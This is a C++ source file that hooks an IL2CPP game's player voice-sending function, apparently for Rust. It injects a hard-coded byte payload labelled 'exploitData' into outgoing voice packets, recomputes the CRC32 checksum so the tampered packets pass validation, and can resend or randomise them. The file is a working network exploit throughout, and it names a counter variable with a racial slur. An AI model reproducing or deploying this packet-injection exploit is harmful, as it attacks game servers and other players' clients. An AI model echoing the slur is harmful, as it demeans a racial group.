#include "hooks.hpp"
#include <iostream>
#include <random>

#include "Util/fast_crc32.h"
#include "Util/color-console.h"

typedef std::mt19937 rng_type;
std::uniform_int_distribution<rng_type::result_type> randomizerRng(0, 0xFF);
std::uniform_int_distribution<rng_type::result_type> repeaterRng(5, 10);

rng_type rng;

const char exploitData[] = "\x68\xF5\x94\x05\x01\x00\x10\x01\x0B\xC0\x5D\xCA\xC8\xD3\xCC\xC9\xD4\xD6\x4B\x45\x4D\x4F\x4E\x4F\xf3\x0e\x2f\x3e";


void hk__BP_SendVoiceData(BasePlayer* instance, System::Array<System::Byte*>* data, int len)
{
	ORIG(hk__BP_SendVoiceData);

	static unsigned int seed = 69; seed += 1;
	rng_type::result_type const seedval = seed;; // get this from somewhere
	rng.seed(seedval);

	constexpr bool repeater = false;
	constexpr bool exploit = true;
	constexpr bool exploitOnly = true;
	constexpr bool doubler = true;
	constexpr bool randomizer = false;

	static int nigger = 0;

	std::cout << std::hex << std::endl;

	nigger -= 5;

	uint32_t crc = crc32_fast(data->data(), data->length() - 4);
	bool crcCheck = (crc == *(uint32_t*)((uintptr_t)data->data() + data->length() - 4));

	System::Array<System::Byte*>* exploitOnlyBuffer = (System::Array<System::Byte*>*)Il2cppLib::new_array("System::Byte", 0x1B);
	auto sendBuffer = exploitOnly ? exploitOnlyBuffer : data;
	
	std::cout 
		<< std::hex << std::showbase
		<< "checksum gen " << (crcCheck ? dye::green("matches") : dye::red("is wrong !!!"))
		<< std::noshowbase << std::endl;

	
	std::cout << std::dec << dye::grey("steam64: ") << dye::grey((uint64_t)(sendBuffer->data()[0])) << std::endl;
	std::cout << std::hex << dye::light_purple("payload type: ") << dye::light_purple(+((uint8_t*)sendBuffer->data())[8]) << std::endl;
	std::cout << std::dec << dye::light_blue("sample rate: ")	 << dye::light_blue((uint16_t)((uint8_t*)sendBuffer->data())[9]) << std::endl;
	std::cout << std::hex << dye::light_purple("payload type: ") << dye::light_purple(+((uint8_t*)sendBuffer->data())[11]) << std::endl;
	std::cout << std::dec << dye::light_blue("data length: ")	 << dye::light_blue((uint16_t)((uint8_t*)sendBuffer->data())[12]) << "\n\n";
	
	for (int i = 0; i < sendBuffer->length(); i++) {
		if (i < 8)
			hue::grey(std::cout);
		else if (i < 9)
			hue::light_purple(std::cout);
		else if (i < 11)
			hue::light_blue(std::cout);
		else if (i < 12)
			hue::light_purple(std::cout);
		else if (i < 14)
			hue::light_blue(std::cout);
		else if (i < sendBuffer->length() - 4)
			hue::reset(std::cout);
		else {
			if (crcCheck)
				hue::green(std::cout);
			else
				hue::red(std::cout);
		}

		constexpr unsigned int lowerBound = 18;

		if (i >= lowerBound) {

			if (randomizer) {
				((uint8_t*)sendBuffer->data())[i] = (uint8_t)randomizerRng(rng);
				hue::light_yellow(std::cout);
			}

			if (exploit && i - lowerBound < sizeof(exploitData)) {
				((uint8_t*)sendBuffer->data())[i] = exploitData[i - lowerBound];
				hue::light_red(std::cout);
			}
			else if (exploitOnly) {
				((uint8_t*)sendBuffer->data())[i] = ((uint8_t*)data->data())[i];
			}
		}

		//std::cout << std::hex << (uintptr_t)((uint8_t*)sendBuffer->data())[i] << " ";
		hue::reset(std::cout);
	}
	
	std::cout << "\n\n";


	if (exploit || randomizer) {
		std::cout << std::hex << dye::light_red("old ") << "crc32 checksum: "
			<< dye::light_red(*(uint32_t*)((uintptr_t)sendBuffer->data() + sendBuffer->length() - 4)) << std::endl;

		*(uint32_t*)((uintptr_t)sendBuffer->data() + sendBuffer->length() - 4)
			= crc32_fast(sendBuffer->data(), sendBuffer->length() - 4);

		std::cout << dye::light_green("new ");
	}

	std::cout << std::hex << "crc32 checksum: "
		<< dye::green(*(uint32_t*)((uintptr_t)sendBuffer->data() + sendBuffer->length() - 4)) << std::endl;

	std::cout << std::dec << std::endl << std::endl;
	

	if (repeater) {
		if (nigger <= 25){
			for (int i = 0; i < repeaterRng(rng); i++) {
				nigger += 1;
				orig(instance, sendBuffer, len);
			}
		}
		return;
	}
	
	if (doubler) {
		orig(instance, sendBuffer, sendBuffer->length());
		return orig(instance, sendBuffer, sendBuffer->length());
	}

	return orig(instance, sendBuffer, sendBuffer->length());
}